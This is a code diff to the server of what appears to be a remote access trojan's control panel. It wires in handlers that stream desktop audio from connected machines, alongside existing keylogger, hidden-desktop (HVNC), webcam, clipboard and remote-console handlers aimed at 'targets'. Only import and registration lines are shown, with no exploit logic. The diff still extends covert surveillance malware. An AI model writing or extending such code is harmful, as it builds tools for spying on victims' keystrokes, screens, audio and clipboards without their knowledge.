@@ -123,6 +123,12 @@ import {
   handleVoiceViewerMessage,
   handleVoiceViewerOpen,
 } from "./server/ws-voice";
+import {
+  cleanupDesktopAudioViewer,
+  handleDesktopAudioUplink,
+  handleDesktopAudioViewerMessage,
+  handleDesktopAudioViewerOpen,
+} from "./server/ws-desktop-audio";
 import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
 import { loadOrGenerateVapidKeys } from "./server/web-push";
 import * as clientManager from "./clientManager";
@@ -496,6 +502,7 @@ async function startServer() {
     handleProcessViewerOpen,
     handleKeyloggerViewerOpen,
     handleVoiceViewerOpen,
+    handleDesktopAudioViewerOpen,
     handleDashboardViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
       const id = crypto.randomUUID();
       ws.data.sessionId = id;
@@ -564,6 +571,7 @@ async function startServer() {
     handleProcessViewerMessage,
     handleKeyloggerViewerMessage,
     handleVoiceViewerMessage,
+    handleDesktopAudioViewerMessage,
     dispatchAutoScriptsForConnection,
     dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
       const proto = tls ? "https" : "http";
@@ -603,12 +611,14 @@ async function startServer() {
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
     handleNotification: notificationPluginHandlers.handleNotification,
     handleVoiceUplink,
+    handleDesktopAudioUplink,
     handleWebcamDevices,
     handleHVNCCloneProgress,
     handleHVNCLookupResult,
     handleHVNCDXGIStatus,
     handleClipboardContent,
     cleanupVoiceViewer,
+    cleanupDesktopAudioViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
     sendHVNCCommand,
